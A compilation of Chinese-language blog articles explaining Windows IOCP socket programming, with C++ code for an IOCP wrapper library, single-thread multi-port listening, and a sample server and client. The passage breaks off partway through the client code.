阻塞模式：比如调用send时，把要发送的数据放到网络发送缓冲区才返回。如果这时，网络发送缓冲区满了，则需要等待更久的时间。socket的收发其实也是一种IO，和读写硬盘数据有些类似。一般来讲，IO处理速度总是慢的，不要和内存处理并列。对于调用recv，至少读取一个字节数据，函数才会返回。所以对于recv，一般用一个单独的线程处理。 非阻塞模式：send和recv都是非阻塞的；比如调用send，函数会立马返回。真正的发送结果，需要等待操作系统的再次通知。阻塞模式下一步可以完成的处理，在非阻塞模式下需要两步。就是多出的这一步，导致开发难度大大增加。高性能大并发网络服务器必须采用非阻塞模式。完成端口（IOCP）是非阻塞模式中性能最好的一种。 作者多年以前，就开始从事winsocket开发，最开始是采用c++、后来采用c#。对高性能服务器设计的体会逐步加深。人要在一定的压力下才能有所成就。最开始的一个项目是移动信令分析，所处理的消息量非常大；高峰期，每秒要处理30万条信令，占用带宽500M。无论是socket通讯还是后面的数据处理，都必须非常优化。所以从项目的开始，我就谨小慎微，对性能特别在意。项目实施后，程序的处理性能出乎意料。一台服务器可以轻松处理一个省的信令数据（项目是08年开始部署，现在的硬件性能远超当时）。程序界面如下： 题外话 通过这个项目我也有些体会：1）不要怀疑Windows的性能，不要怀疑微软的实力。有些人遇到性能问题，或是遇到奇怪的bug，总是把责任推给操作系统；这是不负责任的表现。应该反思自己的开发水平、设计思路。2）开发过程中，需要把业务吃透；业务是开发的基石。不了解业务，不可能开发出高性能的程序。所有的处理都有取舍，每个函数都有他的适应场合。有时候需要拿来主义，有时候需要从头开发一个函数。 ※目标 开发出一个完善的IOCP程序是非常困难的。怎么才能化繁为简？需要把IOCP封装；同时这个封装库要有很好的适应性，能满足各种应用场景。一个好的思路就能事半功倍。我就是围绕这两个目标展开设计。 ※1 程序开发接口 socket处理本质上可以分为：读、写、accept、socket关闭等事件。把这些事件分为两类：a）读、accept、socket关闭 b）写；a类是从库中获取消息，b类是程序主动调用函数。对于a类消息可以调用如下函数： 12345678910111213141516171819202122//消息事件enum Enum_MessageType :char&#123; EN_Accept = 0, EN_Read, EN_Close, EN_Connect&#125;;//返回的数据结构class SocketMessage&#123;public: SOCKET Socket; Enum_MessageType MessageType; //当MessageType为EN_Connect时，BufferLen为EasyIocpLib_Connect函数的tag参数 INT32 BufferLen; char *Buffer;&#125;;//不停的调用此函数，返回数据SocketMessage* EasyIocpLib_GetMessage(UINT64 handle); 对于b类，就是发送数据。当调用发送时，数据被放到库的发送缓冲中，函数里面返回。接口如下： 123456789enum EN_SEND_BUFFER_RESULT&#123; en_send_buffer_ok = 0, //放入到发送缓冲 en_not_validate_socket, //无效的socket句柄 en_send_buffer_full //发送缓冲区满&#125;;EN_SEND_BUFFER_RESULT EasyIocpLib_SendMessage(UINT64 handle, SOCKET socket, char* buffer, int offset, int len, BOOL mustSend = FALSE); 总的思路是接收时，放到接收缓冲；发送时，放到发送缓冲。外部接口只对内存中数据操作，没有任何阻塞。 ※2 具有广泛的适应性 如果网络库可以用到各种场景，所处理的逻辑必须与业务无关。所以本库接收和发送的都是字节流。包协议一般有长度指示或有开始结束符。需要把字节流分成一个个完整的数据包。这就与业务逻辑有关了。所以要有分层处理思想： ※库性能测试 首先对库的性能做测试，使大家对库的性能有初步印象。这些测试都不是很严格，大体能反映程序的性能。IOCP是可扩展的，就是同时处理10个连接与同时处理1000个连接，性能上没有差别。 我的机器配置不高，cup为酷睿2 双核 E7500，相当于i3低端。 1）两台机器测试，一个发送，一个接收：带宽占用40M，整体cpu占用10%，程序占用cpu不超过3%。 2）单台机器，两个程序互发：收发数据达到30M字节，相当于300M带宽，cpu占用大概25%。 3）采用更高性能机器测试，两个程序对发数据：cpu为：i5-7500 CPU @ 3.40GHz 收发数据总和80M字节每秒，接近1G带宽。cpu占用25%。测试程序下载地址 ：《完成端口（IOCP）性能测试程序（c++版本 64位程序）》。只有exe程序，不包括代码。 ※网络库设计思路 服务器要启动监听，当有客户端连接时，生成新的socket句柄；该socket句柄与完成端口关联，后续读写都通过完成端口完成。 ※1 socket监听（Accept处理） 关于监听处理，参考我另一篇文章《单线程实现同时监听多个端口》。 ※2 数据接收 收发数据要用到类型OVERLAPPED。需要对该类型进一步扩充，这样当从完成端口返回时，可以获取具体的数据和操作类型。这是处理完成端口一个非常重要的技巧。 1234567891011121314151617//完成端口操作类型typedef enum&#123; POST_READ_PKG, //读 POST_SEND_PKG, //写 POST_CONNECT_PKG, POST_CONNECT_RESULT&#125;OPERATION_TYPE;struct PER_IO_OPERATION_DATA&#123; WSAOVERLAPPED overlap; //第一个变量，必须是操作系统定义的结构 OPERATION_TYPE opType; SOCKET socket; WSABUF buf; //要读取或发送的数据&#125;; 发送处理：overlap包含要发送的数据。调用此函数会立马返回；当有数据到达时，会有通知。 123456789101112131415161718192021222324252627282930BOOL NetServer::PostRcvBuffer(SOCKET socket, PER_IO_OPERATION_DATA *overlap)&#123; DWORD flags = MSG_PARTIAL; DWORD numToRecvd = 0; overlap-&gt;opType = OPERATION_TYPE::POST_READ_PKG; overlap-&gt;socket = socket; int ret = WSARecv(socket, &amp;overlap-&gt;buf, 1, &amp;numToRecvd, &amp;flags, &amp;(overlap-&gt;overlap), NULL); if (ret != 0) &#123; if (WSAGetLastError() == WSA_IO_PENDING) &#123; ret = NO_ERROR; &#125; else &#123; ret = SOCKET_ERROR; &#125; &#125; return (ret == NO_ERROR);&#125; 从完成端口获取读数据事件通知： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687DWORD NetServer::Deal_CompletionRoutine()&#123; DWORD dwBytesTransferred; PER_IO_OPERATION_DATA *lpPerIOData = NULL; ULONG_PTR Key; BOOL rc; int error; while (m_bServerStart) &#123; error = NO_ERROR; //从完成端口获取事件 rc = GetQueuedCompletionStatus( m_hIocp, &amp;dwBytesTransferred, &amp;Key, (LPOVERLAPPED *)&amp;lpPerIOData, INFINITE); if (rc == FALSE) &#123; error = 123; if (lpPerIOData == NULL) &#123; DWORD lastError = GetLastError(); if (lastError == WAIT_TIMEOUT) &#123; continue; &#125; else &#123; //continue; //程序结束 assert(false); return lastError; &#125; &#125; else &#123; if (GetNetResult(lpPerIOData, dwBytesTransferred) == FALSE) &#123; error = WSAGetLastError(); &#125; &#125; &#125; if (lpPerIOData != NULL) &#123; switch (lpPerIOData-&gt;opType) &#123; case POST_READ_PKG: //读函数返回 &#123; OnIocpReadOver(*lpPerIOData, dwBytesTransferred, error); &#125; break; case POST_SEND_PKG: &#123; OnIocpWriteOver(*lpPerIOData, dwBytesTransferred, error); &#125; break; &#125; &#125; &#125; return 0;&#125;void NetServer::OnIocpReadOver(PER_IO_OPERATION_DATA&amp; opData, DWORD nBytesTransfered, DWORD error)&#123; if (error != NO_ERROR || nBytesTransfered == 0)//socket出错 &#123; Net_CloseSocket(opData.socket); NetPool::PutIocpData(&amp;opData);//数据缓冲处理 &#125; else &#123; OnRcvBuffer(opData, nBytesTransfered);//处理接收到的数据 BOOL post = PostRcvBuffer(opData.socket, &amp;opData); //再次读数据 if (!post) &#123; Net_CloseSocket(opData.socket); NetPool::PutIocpData(&amp;opData); &#125; &#125;&#125; ※3 数据发送 数据发送时，先放到发送缓冲，再发送。向完成端口投递时，每个连接同时只能有一个正在投递的操作 1234567891011121314151617181920212223242526272829BOOL NetServer::PostSendBuffer(SOCKET socket)&#123; if (m_clientManage.IsPostSendBuffer(socket)) //如果有正在执行的投递，不能再次投递 return FALSE; //获取要发送的数据 PER_IO_OPERATION_DATA *overlap = NetPool::GetIocpData(FALSE); int sendCount = m_clientManage.GetSendBuf(socket, overlap-&gt;buf); if (sendCount == 0) &#123; NetPool::PutIocpData(overlap); return FALSE; &#125; overlap-&gt;socket = socket; overlap-&gt;opType = POST_SEND_PKG; BOOL post = PostSendBuffer(socket, overlap); if (!post) &#123; Net_CloseSocket(socket); NetPool::PutIocpData(overlap); return FALSE; &#125; else &#123; m_clientManage.SetPostSendBuffer(socket, TRUE); return TRUE; &#125;&#125; ※总结 开发一个好的封装库必须有的好的思路。对复杂问题要学会分解，每个模块功能合理，适应性要强；要有模块化、层次化处理思路。如果网络库也处理业务逻辑，处理具体包协议，它就无法做到通用性。一个通用性好的库，才值得我们花费大气力去做好。我设计的这个库，用在了公司多个系统上；以后无论遇到任何网络协议，这个库都可以用得上，一劳永逸的解决网络库封装问题。 ※单线程实现同时监听多个端口（windows平台c++代码）[8] ※前言 多年前开发了一套网络库，底层实现采用IOCP（完成端口）。该库已在公司多个程序中应用；经过多次修改，长时间检验，已经非常稳定高效。最近把以前的代码梳理了一下，又加进了一些新的思路。代码结构更加合理，性能也有所提升。打算将该库一些的知识点写出来，以供参考。服务端要在多个端口监听，这种场合并不多见。但作为一个完善的网络库，似乎有必要支持此功能的。 ※传统实现方法 如果监听端口个数很少，也可以采用传统的方法。因为accept函数是阻塞的，所以要实现在n个端口监听，就需要n个线程。如果监听端口个数不多，这也不是多大问题。如果监听端口多达几十个，这种方法就有些不妥。线程也是一种资源，线程过多占用资源会增加；也会导致系统负担加重。 ※更可行的实现方法 实现方法有些曲折，需要一步一步分析；基本的原理就是将socket句柄与事件（event）相关联。Windows有相关的函数可以对多个事件监听，当某个事件被触发，就知道相应的socket有事件到达。可以对该socket做accept，因为已经确定该socket有事件了，所以accept函数会立即返回。这样就达到对多个端口同时监听的目的。 ※1）生成socket，并与某个端口绑定 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556struct LISTEN_SOCKET_INFO&#123; UINT16 listenPort; //监听端口 SOCKET listenSocket;//句柄 WSAEVENT netEvent; //socket对应事件&#125;;int IocpAccept::CreateListenInfo()&#123; //m_listListenPort存储要监听的端口；总个数不超过64个 std::vector&lt;UINT16&gt;::iterator pos = m_listListenPort.begin(); for (;pos != m_listListenPort.end();++pos) &#123; //生成socket UINT16 listenPort = *pos; LISTEN_SOCKET_INFO socketInfo; socketInfo.listenSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); socketInfo.listenPort = listenPort; //绑定端口 sockaddr_in InetAddr; InetAddr.sin_family = AF_INET; InetAddr.sin_addr.s_addr = htonl(INADDR_ANY); InetAddr.sin_port = htons(listenPort); int ret = bind(socketInfo.listenSocket, (SOCKADDR *)&amp;InetAddr, sizeof(InetAddr)); if (SOCKET_ERROR == ret) &#123; ::closesocket(socketInfo.listenSocket); //绑定失败 continue; &#125; //生成事件 socketInfo.netEvent = WSACreateEvent(); //将socket句柄与事件关联起来。只监视socket的accept和close消息 ret = WSAEventSelect(socketInfo.listenSocket, socketInfo.netEvent, FD_ACCEPT | FD_CLOSE); if (SOCKET_ERROR == ret) &#123; ::closesocket(socketInfo.listenSocket); continue; &#125; // 启动监听 ret = listen(socketInfo.listenSocket, 1000); if (SOCKET_ERROR == ret) &#123; ::closesocket(socketInfo.listenSocket); continue; &#125; m_listListenInfo.push_back(socketInfo); &#125; return 0;&#125; 该函数已将需要的数据存储在列表m_listListenInfo中。 ※2）启动监听线程，对多个事件监听 对多个事件监听用到如下函数： DWORD WSAAPI WSAWaitForMultipleEvents( DWORD cEvents, const WSAEVENT *lphEvents, BOOL fWaitAll, DWORD dwTimeout, BOOL fAlertable );该函数最多可以对64个事件做跟踪，所以一个线程最多可以对64个端口做监听。（同时对超过64个端口监听的场合非常少见。本文不考虑。） 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051//生成事件地址指针 int nEventTotal; WSAEVENT* pEventArray = CreateNetEventArray(&amp;nEventTotal); if (nEventTotal == 0) return 0; assert(nEventTotal &lt;= WSA_MAXIMUM_WAIT_EVENTS); MSG msg; while (m_bServerStart) &#123; // 同时对多个事件做监听 DWORD index = WSAWaitForMultipleEvents(nEventTotal, pEventArray, FALSE, 10000, FALSE); if (!m_bServerStart) return 0; //查看是哪个事件触发函数返回 index = index - WSA_WAIT_EVENT_0; //客户端连接事件 if ((index != WSA_WAIT_FAILED) &amp;&amp; (index != WSA_WAIT_TIMEOUT)) &#123; //pEventArray排序与m_listListenInfo一样，所以可以根据index找到对应的socket。 //就是该socket导致函数返回 LISTEN_SOCKET_INFO socketInfo = m_listListenInfo[index]; //查看具体是什么事件导致函数返回 WSANETWORKEVENTS NetworkEvents; WSAEnumNetworkEvents(socketInfo.listenSocket, pEventArray[index], &amp;NetworkEvents); //如果是accept事件，说明有客户端连接此端口 if (NetworkEvents.lNetworkEvents == FD_ACCEPT &amp;&amp; NetworkEvents.iErrorCode[FD_ACCEPT_BIT] == 0) &#123; //这时调用accept函数，会立即返回 AcceptListenPort(socketInfo.listenSocket, socketInfo.listenPort); &#125; if (NetworkEvents.lNetworkEvents == FD_CLOSE &amp;&amp; NetworkEvents.iErrorCode[FD_CLOSE_BIT] == 0) &#123; assert(false); &#125; &#125; else &#123; //因为超时等其他原因引起函数返回 &#125; &#125; 下文accept函数调用，并不会阻塞。 1234567891011121314151617181920212223242526UINT IocpAccept::AcceptListenPort(SOCKET hListenSocket, UINT16 nListenPort)&#123; SOCKET hClient = 0; SOCKADDR_IN localAddr; int iaddrSize = sizeof(SOCKADDR_IN); hClient = accept(hListenSocket, (struct sockaddr *)&amp;localAddr, &amp;iaddrSize); if (INVALID_SOCKET == hClient) &#123; int nAccepetError = WSAGetLastError(); if (nAccepetError == WSAECONNRESET) &#123; return 1; &#125; else &#123; return 0; &#125; &#125; else &#123; //获取了一个客户端连接 OnAcceptClient(hClient, nListenPort); &#125; return 0;&#125; 后记：同时对多个端口做监听，可能还有更好的方法。如果对几百个以上端口做监听，此方法可能就不太合适。通常情况下，对多个端口监听的场景比较少见，所以对更优化的处理方法也没深究。 ※IOCP详解：如何通过IOCP（I/O Completion Port）提升I/O性能[9] *简介：*IOCP（I/O Completion Port）是一种性能卓越的I/O模型，通过使用线程池处理异步I/O请求，有效提升系统性能。本文将深入解析IOCP的工作原理和优势，并探讨如何在实际应用中实现和优化IOCP。 IOCP（I/O Completion Port，I/O完成端口）是一种高效的I/O处理机制，尤其在处理大量并发异步I/O请求时表现出色。通过使用IOCP，应用程序可以利用线程池来管理异步I/O操作，避免了为每个I/O请求创建新线程的开销，提高了系统的整体性能。 在传统的I/O处理模型中，每当一个I/O请求到来时，系统会为其创建一个新线程来处理请求。这种方式会导致大量线程在系统中并行运行，增加了上下文切换的开销。由于线程的创建和销毁都需要耗费资源，这种方式的效率相对较低。 IOCP通过改进传统的I/O处理方式，解决了这些问题。它利用一个预先创建的线程池来处理异步I/O请求，避免了频繁的线程创建和销毁。当一个异步I/O操作完成时，IOCP会向一个特定的完成端口发送通知。应用程序可以在完成端口上等待操作结果，一旦收到完成通知，就可以对数据进行处理。 这种模型的优势在于，它减少了线程的创建和销毁开销，降低了上下文切换的频率，从而提高了系统的整体性能。此外，IOCP还提供了更好的可扩展性，能够轻松应对大量并发I/O请求。 在实际应用中，要实现IOCP，需要创建一个完成端口对象，并将线程池中的线程与该完成端口关联起来。一旦应用程序发起一个异步I/O操作，该操作会被提交到完成端口，并由关联的线程来处理。完成端口会负责管理这些操作的完成状态，并在操作完成后通知应用程序。 应用程序在完成端口上等待操作结果时，可以选择使用阻塞或非阻塞方式。阻塞方式会一直等待操作完成或超时，而非阻塞方式则会定期检查操作状态。根据实际需求选择合适的方式可以提高应用程序的效率和响应性。 值得注意的是，IOCP虽然具有显著的优势，但在某些场景下可能并不是最佳选择。例如，对于一些轻量级的I/O操作或小规模并发请求，使用IOCP可能会引入过多的开销。因此，在实际应用中，需要根据具体情况权衡利弊，选择最适合的I/O模型。 此外，为了充分利用IOCP的优势，还需要注意以下几点： 合理配置线程池的大小：根据实际需求和系统资源来调整线程池的大小，以获得最佳的性能表现。 避免过多的上下文切换：通过合理安排线程的执行顺序和优先级，减少不必要的上下文切换。 优化数据结构和算法：针对实际应用的场景，选择合适的数据结构和算法来提高I/O操作的效率。 监控和调优：定期监控系统的性能指标，根据实际情况对IOCP进行调优，以适应不断变化的工作负载。 总结来说，IOCP是一种高效、可扩展的I/O处理机制，通过合理配置和应用优化，可以帮助应用程序更好地应对大量并发异步I/O请求。了解IOCP的工作原理和应用技巧有助于在实际应用中提升系统的整体性能。 ※IOCP模型与网络编程[10] ※前言 在老师分配任务（“尝试利用IOCP模型写出服务端和客户端的代码”）给我时，脑子一片空白，并不知道什么是IOCP模型，会不会是像软件设计模式里面的工厂模式，装饰模式之类的那些呢？嘿嘿，不过好像是一个挺好玩的东西，挺好奇是什么东西来的，又是一个新知识啦~于是，开始去寻找一大堆的资料，为这个了解做准备，只是呢，有时还是想去找一本书去系统地学习一下，毕竟网络的资料还是有点零散。话说，本人学习这个模型的基础是，写过一个简单的Socket服务器及客户端程序，外加一个简单的Socket单服务器对多客户端程序，懂一点点的操作系统原理的知识。于是，本着一个学习与应用的态度开始探究这个IOCP是个什么东西。 ※提出相关问题 IOCP模型是什么？ IOCP模型是用来解决什么问题的？它为什么存在？ 使用IOCP模型需要用到哪些知识？ 如何使用IOCP模型与Socket网络编程结合起来？ 学会了这个模型以后与我之前写过的简单的socket程序主要有哪些不同点？ ※部分问题探究及解决：（绝大多数是个人理解，再加上个人是菜鸟，如果有什么不对的地方，欢迎指正） 什么是IOCP？什么是IOCP模型？IOCP模型有什么作用？ IOCP（I/O Completion Port）,常称I/O完成端口。 IOCP模型属于一种通讯模型，适用于(能控制并发执行的)高负载服务器的一个技术。 通俗一点说，就是用于高效处理很多很多的客户端进行数据交换的一个模型。 或者可以说，就是能异步I/O操作的模型。 只是了解到这些会让人很糊涂，因为还是不知道它究意具体是个什么东东呢？ 下面我想给大家看三个图：第一个是IOCP的内部工作队列图。(整合于《IOCP本质论》文章，在英文的基础上加上中文对照) 第二个是程序实现IOCP模型的基本步骤。(整合于《深入解释IOCP》，加个人观点、理解、翻译) 第三个是使用了IOCP模型及没使用IOCP模型的程序流程图。(个人理解绘制) IOCP的存在理由（IOCP的优点）及技术相关有哪些？ 之前说过，很通俗地理解可以理解成是用于高效处理很多很多的客户端进行数据交换的一个模型，那么，它具体的优点有些什么呢？它到底用到了哪些技术了呢？在Windows环境下又如何去使用这些技术来编程呢？它主要使用上哪些API函数呢？呃~看来我真是一个问题多多的人，跟前面提出的相关问题变种延伸了不少的问题，好吧，下面一个个来解决。 使用IOCP模型编程的优点 ① 帮助维持重复使用的内存池。(与重叠I/O技术有关) ② 去除删除线程创建/终结负担。 ③ 利于管理，分配线程，控制并发，最小化的线程上下文切换。 ④ 优化线程调度，提高CPU和内存缓冲的命中率。 使用IOCP模型编程汲及到的知识点（无先后顺序） ① 同步与异步 ② 阻塞与非阻塞 ③ 重叠I/O技术 ④ 多线程 ⑤ 栈、队列这两种基本的数据结构 需要使用上的API函数 ① 与SOCKET相关 1、链接套接字动态链接库：int WSAStartup(…); 2、创建套接字库： SOCKET socket(…); 3、绑字套接字： int bind(…); 4、套接字设为监听状态： int listen(…); 5、接收套接字： SOCKET accept(…); 6、向指定套接字发送信息：int send(…); 7、从指定套接字接收信息：int recv(…); ② 与线程相关 1、创建线程：HANDLE CreateThread(…); ③ 重叠I/O技术相关 1、向套接字发送数据： int WSASend(…); 2、向套接字发送数据包： int WSASendFrom(…); 3、从套接字接收数据： int WSARecv(…); 4、从套接字接收数据包： int WSARecvFrom(…); ④ IOCP相关 1、创建完成端口： HANDLE WINAPI CreateIoCompletionPort(…); 2、关联完成端口： HANDLE WINAPI CreateIoCompletionPort(…); 3、获取队列完成状态: BOOL WINAPI GetQueuedCompletionStatus(…); 4、投递一个队列完成状态：BOOL WINAPI PostQueuedCompletionStatus(…); ※完整的简单的IOCP服务器与客户端代码实例 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241// IOCP_TCPIP_Socket_Server.cpp #include &lt;WinSock2.h&gt;#include &lt;Windows.h&gt;#include &lt;vector&gt;#include &lt;iostream&gt; using namespace std; #pragma comment(lib, &quot;Ws2_32.lib&quot;) // Socket编程需用的动态链接库#pragma comment(lib, &quot;Kernel32.lib&quot;) // IOCP需要用到的动态链接库 /** * 结构体名称：PER_IO_DATA * 结构体功能：重叠I/O需要用到的结构体，临时记录IO数据 **/const int DataBuffSize = 2 * 1024;typedef struct&#123; OVERLAPPED overlapped; WSABUF databuff; char buffer[ DataBuffSize ]; int BufferLen; int operationType;&#125;PER_IO_OPERATEION_DATA, *LPPER_IO_OPERATION_DATA, *LPPER_IO_DATA, PER_IO_DATA; /** * 结构体名称：PER_HANDLE_DATA * 结构体存储：记录单个套接字的数据，包括了套接字的变量及套接字的对应的客户端的地址。 * 结构体作用：当服务器连接上客户端时，信息存储到该结构体中，知道客户端的地址以便于回访。 **/typedef struct&#123; SOCKET socket; SOCKADDR_STORAGE ClientAddr;&#125;PER_HANDLE_DATA, *LPPER_HANDLE_DATA; // 定义全局变量const int DefaultPort = 6000; vector &lt; PER_HANDLE_DATA* &gt; clientGroup; // 记录客户端的向量组 HANDLE hMutex = CreateMutex(NULL, FALSE, NULL);DWORD WINAPI ServerWorkThread(LPVOID CompletionPortID);DWORD WINAPI ServerSendThread(LPVOID IpParam); // 开始主函数int main()&#123;// 加载socket动态链接库 WORD wVersionRequested = MAKEWORD(2, 2); // 请求2.2版本的WinSock库 WSADATA wsaData; // 接收Windows Socket的结构信息 DWORD err = WSAStartup(wVersionRequested, &amp;wsaData); if (0 != err)&#123; // 检查套接字库是否申请成功 cerr &lt;&lt; &quot;Request Windows Socket Library Error!\\n&quot;; system(&quot;pause&quot;); return -1; &#125; if(LOBYTE(wsaData.wVersion) != 2 || HIBYTE(wsaData.wVersion) != 2)&#123;// 检查是否申请了所需版本的套接字库 WSACleanup(); cerr &lt;&lt; &quot;Request Windows Socket Version 2.2 Error!\\n&quot;; system(&quot;pause&quot;); return -1; &#125; // 创建IOCP的内核对象 /** * 需要用到的函数的原型： * HANDLE WINAPI CreateIoCompletionPort( * __in HANDLE FileHandle, // 已经打开的文件句柄或者空句柄，一般是客户端的句柄 * __in HANDLE ExistingCompletionPort, // 已经存在的IOCP句柄 * __in ULONG_PTR CompletionKey, // 完成键，包含了指定I/O完成包的指定文件 * __in DWORD NumberOfConcurrentThreads // 真正并发同时执行最大线程数，一般推介是CPU核心数*2 * ); **/ HANDLE completionPort = CreateIoCompletionPort( INVALID_HANDLE_VALUE, NULL, 0, 0); if (NULL == completionPort)&#123; // 创建IO内核对象失败 cerr &lt;&lt; &quot;CreateIoCompletionPort failed. Error:&quot; &lt;&lt; GetLastError() &lt;&lt; endl; system(&quot;pause&quot;); return -1; &#125; // 创建IOCP线程--线程里面创建线程池 // 确定处理器的核心数量 SYSTEM_INFO mySysInfo; GetSystemInfo(&amp;mySysInfo); // 基于处理器的核心数量创建线程 for(DWORD i = 0; i &lt; (mySysInfo.dwNumberOfProcessors * 2); ++i)&#123; // 创建服务器工作器线程，并将完成端口传递到该线程 HANDLE ThreadHandle = CreateThread(NULL, 0, ServerWorkThread, completionPort, 0, NULL); if(NULL == ThreadHandle)&#123; cerr &lt;&lt; &quot;Create Thread Handle failed. Error:&quot; &lt;&lt; GetLastError() &lt;&lt; endl; system(&quot;pause&quot;); return -1; &#125; CloseHandle(ThreadHandle); &#125; // 建立流式套接字 SOCKET srvSocket = socket(AF_INET, SOCK_STREAM, 0); // 绑定SOCKET到本机 SOCKADDR_IN srvAddr; srvAddr.sin_addr.S_un.S_addr = htonl(INADDR_ANY); srvAddr.sin_family = AF_INET; srvAddr.sin_port = htons(DefaultPort); int bindResult = bind(srvSocket, (SOCKADDR*)&amp;srvAddr, sizeof(SOCKADDR)); if(SOCKET_ERROR == bindResult)&#123; cerr &lt;&lt; &quot;Bind failed. Error:&quot; &lt;&lt; GetLastError() &lt;&lt; endl; system(&quot;pause&quot;); return -1; &#125; // 将SOCKET设置为监听模式 int listenResult = listen(srvSocket, 10); if(SOCKET_ERROR == listenResult)&#123; cerr &lt;&lt; &quot;Listen failed. Error: &quot; &lt;&lt; GetLastError() &lt;&lt; endl; system(&quot;pause&quot;); return -1; &#125; // 开始处理IO数据 cout &lt;&lt; &quot;本服务器已准备就绪，正在等待客户端的接入...\\n&quot;; // 创建用于发送数据的线程 HANDLE sendThread = CreateThread(NULL, 0, ServerSendThread, 0, 0, NULL); while(true)&#123; PER_HANDLE_DATA * PerHandleData = NULL; SOCKADDR_IN saRemote; int RemoteLen; SOCKET acceptSocket; // 接收连接，并分配完成端，这儿可以用AcceptEx() RemoteLen = sizeof(saRemote); acceptSocket = accept(srvSocket, (SOCKADDR*)&amp;saRemote, &amp;RemoteLen); if(SOCKET_ERROR == acceptSocket)&#123; // 接收客户端失败 cerr &lt;&lt; &quot;Accept Socket Error: &quot; &lt;&lt; GetLastError() &lt;&lt; endl; system(&quot;pause&quot;); return -1; &#125; // 创建用来和套接字关联的单句柄数据信息结构 PerHandleData = (LPPER_HANDLE_DATA)GlobalAlloc(GPTR, sizeof(PER_HANDLE_DATA)); // 在堆中为这个PerHandleData申请指定大小的内存 PerHandleData -&gt; socket = acceptSocket; memcpy (&amp;PerHandleData -&gt; ClientAddr, &amp;saRemote, RemoteLen); clientGroup.push_back(PerHandleData); // 将单个客户端数据指针放到客户端组中 // 将接受套接字和完成端口关联 CreateIoCompletionPort((HANDLE)(PerHandleData -&gt; socket), completionPort, (DWORD)PerHandleData, 0); // 开始在接受套接字上处理I/O使用重叠I/O机制 // 在新建的套接字上投递一个或多个异步 // WSARecv或WSASend请求，这些I/O请求完成后，工作者线程会为I/O请求提供服务 // 单I/O操作数据(I/O重叠) LPPER_IO_OPERATION_DATA PerIoData = NULL; PerIoData = (LPPER_IO_OPERATION_DATA)GlobalAlloc(GPTR, sizeof(PER_IO_OPERATEION_DATA)); ZeroMemory(&amp;(PerIoData -&gt; overlapped), sizeof(OVERLAPPED)); PerIoData-&gt;databuff.len = 1024; PerIoData-&gt;databuff.buf = PerIoData-&gt;buffer; PerIoData-&gt;operationType = 0; // read DWORD RecvBytes; DWORD Flags = 0; WSARecv(PerHandleData-&gt;socket, &amp;(PerIoData-&gt;databuff), 1, &amp;RecvBytes, &amp;Flags, &amp;(PerIoData-&gt;overlapped), NULL); &#125; system(&quot;pause&quot;); return 0;&#125; // 开始服务工作线程函数DWORD WINAPI ServerWorkThread(LPVOID IpParam)&#123; HANDLE CompletionPort = (HANDLE)IpParam; DWORD BytesTransferred; LPOVERLAPPED IpOverlapped; LPPER_HANDLE_DATA PerHandleData = NULL; LPPER_IO_DATA PerIoData = NULL; DWORD RecvBytes; DWORD Flags = 0; BOOL bRet = false; while(true)&#123; bRet = GetQueuedCompletionStatus(CompletionPort, &amp;BytesTransferred, (PULONG_PTR)&amp;PerHandleData, (LPOVERLAPPED*)&amp;IpOverlapped, INFINITE); if(bRet == 0)&#123; cerr &lt;&lt; &quot;GetQueuedCompletionStatus Error: &quot; &lt;&lt; GetLastError() &lt;&lt; endl; return -1; &#125; PerIoData = (LPPER_IO_DATA)CONTAINING_RECORD(IpOverlapped, PER_IO_DATA, overlapped); // 检查在套接字上是否有错误发生 if(0 == BytesTransferred)&#123; closesocket(PerHandleData-&gt;socket); GlobalFree(PerHandleData); GlobalFree(PerIoData); continue; &#125; // 开始数据处理，接收来自客户端的数据 WaitForSingleObject(hMutex,INFINITE); cout &lt;&lt; &quot;A Client says: &quot; &lt;&lt; PerIoData-&gt;databuff.buf &lt;&lt; endl; ReleaseMutex(hMutex); // 为下一个重叠调用建立单I/O操作数据 ZeroMemory(&amp;(PerIoData-&gt;overlapped), sizeof(OVERLAPPED)); // 清空内存 PerIoData-&gt;databuff.len = 1024; PerIoData-&gt;databuff.buf = PerIoData-&gt;buffer; PerIoData-&gt;operationType = 0; // read WSARecv(PerHandleData-&gt;socket, &amp;(PerIoData-&gt;databuff), 1, &amp;RecvBytes, &amp;Flags, &amp;(PerIoData-&gt;overlapped), NULL); &#125; return 0;&#125; // 发送信息的线程执行函数DWORD WINAPI ServerSendThread(LPVOID IpParam)&#123; while(1)&#123; char talk[200]; gets(talk); int len; for (len = 0; talk[len] != &#x27;\\0&#x27;; ++len)&#123; // 找出这个字符组的长度 &#125; talk[len] = &#x27;\\n&#x27;; talk[++len] = &#x27;\\0&#x27;; printf(&quot;I Say:&quot;); cout &lt;&lt; talk; WaitForSingleObject(hMutex,INFINITE); for(int i = 0; i &lt; clientGroup.size(); ++i)&#123; send(clientGroup[i]-&gt;socket, talk, 200, 0); // 发送信息 &#125; ReleaseMutex(hMutex); &#125; return 0;&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130// IOCP_TCPIP_Socket_Client.cpp #include &lt;iostream&gt;#include &lt;cstdio&gt;#include &lt;string&gt;#include &lt;cstring&gt;#include &lt;winsock2.h&gt;#include &lt;Windows.h&gt; using namespace std; #pragma comment(lib, &quot;Ws2_32.lib&quot;) // Socket编程需用的动态链接库 SOCKET sockClient; // 连接成功后的套接字HANDLE bufferMutex; // 令其能互斥成功正常通信的信号量句柄const int DefaultPort = 6000; int main()&#123;// 加载socket动态链接库(dll) WORD wVersionRequested; WSADATA wsaData; // 这结构是用于接收Wjndows Socket的结构信息的 wVersionRequested = MAKEWORD( 2, 2 ); // 请求2.2版本的WinSock库 int err = WSAStartup( wVersionRequested, &amp;wsaData ); if ( err != 0 ) &#123; // 返回值为零的时候是表示成功申请WSAStartup return -1; &#125; if ( LOBYTE( wsaData.wVersion ) != 2 || 